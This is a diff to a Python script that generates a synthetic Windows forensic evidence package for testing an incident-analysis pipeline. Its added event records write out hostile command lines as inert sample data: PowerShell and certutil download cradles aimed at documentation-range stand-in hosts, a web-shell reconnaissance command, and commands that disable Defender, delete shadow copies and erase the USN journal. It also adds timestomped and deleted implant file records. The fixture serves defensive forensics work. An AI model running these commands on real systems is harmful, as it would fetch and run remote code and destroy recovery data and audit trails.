@@ -8,6 +8,7 @@ analyze pipeline be exercised end-to-end without a real endpoint.
 Run:  python examples/make_sample_collection.py
 """
 
+import base64
 import hashlib
 import json
 from pathlib import Path
@@ -15,6 +16,20 @@ from pathlib import Path
 OUT = Path(__file__).resolve().parent / "sample-collection"
 HOST = "WEB-03"
 C2 = "203.0.113.45"
+# RFC 5737 documentation ranges used for the (inert) download cradles below.
+DOC_IP_A = "198.51.100.23"   # TEST-NET-2
+DOC_IP_B = "198.51.100.50"
+
+
+def _enc_ps(script: str) -> str:
+    """PowerShell -EncodedCommand encoding: UTF-16LE then base64 (inert, synthetic)."""
+    return base64.b64encode(script.encode("utf-16-le")).decode("ascii")
+
+
+# A benign, documentation-range download cradle — exactly what -EncodedCommand
+# hides in a real intrusion, but pointed at an RFC 5737 address and never run.
+CRADLE_PLAINTEXT = (f"IEX (New-Object Net.WebClient).DownloadString('http://{DOC_IP_A}/stage.ps1')")
+CRADLE_B64 = _enc_ps(CRADLE_PLAINTEXT)
 
 PROCESSES = [
     {"pid": 700, "ppid": 660, "name": "explorer.exe", "path": "C:\\Windows\\explorer.exe",
@@ -76,15 +91,32 @@ def e(ts, eid, detail, **kw):
 
 
 EVENTS = [
+    # --- delivery + execution (the original download+exec story) -------------
+    e("2026-05-02T09:10:30Z", 4688, "certutil URLCache download", process="certutil.exe",
+      cmdline=f"certutil.exe -urlcache -split -f http://{DOC_IP_A}/p.exe C:\\Users\\Public\\p.exe"),
+    e("2026-05-02T09:11:00Z", 4688, "encoded PowerShell download cradle", process="powershell.exe",
+      cmdline=f"powershell.exe -nop -w hidden -ep bypass -enc {CRADLE_B64}"),
+    e("2026-05-02T09:11:05Z", 4104,
+      f"ScriptBlock: {CRADLE_PLAINTEXT}", channel="Microsoft-Windows-PowerShell/Operational"),
+    e("2026-05-02T09:11:30Z", 4688, "IIS worker spawned a shell (web shell)", process="cmd.exe",
+      parent_process="w3wp.exe", cmdline="cmd.exe /c whoami & net user"),
     e("2026-05-02T09:12:00Z", 4688, "encoded PowerShell", process="powershell.exe",
       cmdline="powershell -nop -w hidden -enc SQBFAFgA"),
     e("2026-05-02T09:12:05Z", 4104, "ScriptBlock: IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.45/a')",
       channel="Microsoft-Windows-PowerShell/Operational"),
     e("2026-05-02T09:13:00Z", 7045, "A new service was installed: FakeSvc"),
-    e("2026-05-02T09:14:00Z", 4688, "proxied execution", process="rundll32.exe"),
+    e("2026-05-02T09:14:00Z", 4688, "proxied execution", process="rundll32.exe",
+      cmdline="rundll32.exe C:\\Users\\Public\\d.dll,Run"),
     e("2026-05-02T09:16:00Z", 4720, "A user account was created: supportadmin"),
     e("2026-05-02T09:18:00Z", 4698, "Scheduled task created: \\Updater -> C:\\Users\\Public\\svchost.exe"),
     e("2026-05-02T09:25:00Z", 6416, "external device recognized: USBSTOR"),
+    # --- anti-forensics: disable defenses, destroy recovery + journals -------
+    e("2026-05-02T09:38:00Z", 4688, "Defender real-time monitoring disabled", process="powershell.exe",
+      cmdline="powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true"),
+    e("2026-05-02T09:38:30Z", 4688, "shadow copies deleted", process="vssadmin.exe",
+      cmdline="vssadmin.exe delete shadows /all /quiet"),
+    e("2026-05-02T09:39:00Z", 4688, "USN change journal deleted", process="fsutil.exe",
+      cmdline="fsutil usn deletejournal /D C:"),
     e("2026-05-02T09:40:00Z", 1102, "The audit log was cleared"),
 ]
 
@@ -119,6 +151,23 @@ FILESYSTEM = [
     {"path": "C:\\Users\\Public\\d.dll", "name": "d.dll",
      "created": "2026-05-02T09:13:40Z", "modified": "2026-05-02T09:13:40Z",
      "mft_modified": "2026-05-02T09:13:40Z", "size": 18944, "is_directory": False},
+    # Timestomped implant: SI (0x10) creation backdated to look like an OS driver,
+    # but FN (0x30) — set when the record was created — shows the real drop time.
+    # SI-created < FN-created is impossible naturally, so this is a clear timestomp.
+    {"path": "C:\\Windows\\System32\\drivers\\update.sys", "name": "update.sys",
+     "created": "2009-07-14T01:14:24Z", "modified": "2009-07-14T01:14:24Z",
+     "mft_modified": "2026-05-02T09:13:10Z",
+     "fn_created": "2026-05-02T09:13:00Z", "fn_modified": "2026-05-02T09:13:00Z",
+     "fn_record_change": "2026-05-02T09:13:10Z",
+     "size": 24576, "is_directory": False, "deleted": False},
+    # Deleted second-stage dropper: the $MFT record is no longer in use (InUse=false)
+    # — the attacker deleted it, but the record survives for recovery.
+    {"path": "C:\\Users\\Public\\stage2.exe", "name": "stage2.exe",
+     "created": "2026-05-02T09:15:00Z", "modified": "2026-05-02T09:15:00Z",
+     "mft_modified": "2026-05-02T09:15:30Z",
+     "fn_created": "2026-05-02T09:15:00Z", "fn_modified": "2026-05-02T09:15:00Z",
+     "fn_record_change": "2026-05-02T09:15:30Z",
+     "size": 40960, "is_directory": False, "deleted": True},
 ]
 
 PREFETCH = [
@@ -165,12 +214,19 @@ FILES = {
 }
 
 
+def _write(path: Path, text: str) -> None:
+    # Always write LF (newline="\n" suppresses the platform translation), so the
+    # bytes — and therefore the SHA-256s in the manifest — are identical on every
+    # OS. Paired with the `-text` .gitattributes rule, custody survives checkout.
+    path.write_text(text, encoding="utf-8", newline="\n")
+
+
 def main():
     OUT.mkdir(parents=True, exist_ok=True)
     entries = []
     for name, data in FILES.items():
         path = OUT / name
-        path.write_text(json.dumps(data, indent=2))
+        _write(path, json.dumps(data, indent=2))
         sha = hashlib.sha256(path.read_bytes()).hexdigest().upper()
         entries.append({"name": name, "sha256": sha, "count": len(data)})
     manifest = {
@@ -181,7 +237,7 @@ def main():
                  "collected_at": "2026-05-02T10:05:00Z"},
         "collected_at": "2026-05-02T10:05:00Z", "files": entries,
     }
-    (OUT / "manifest.json").write_text(json.dumps(manifest, indent=2))
+    _write(OUT / "manifest.json", json.dumps(manifest, indent=2))
     print(f"wrote sample collection package -> {OUT} ({len(entries)} artifact files)")
 
 
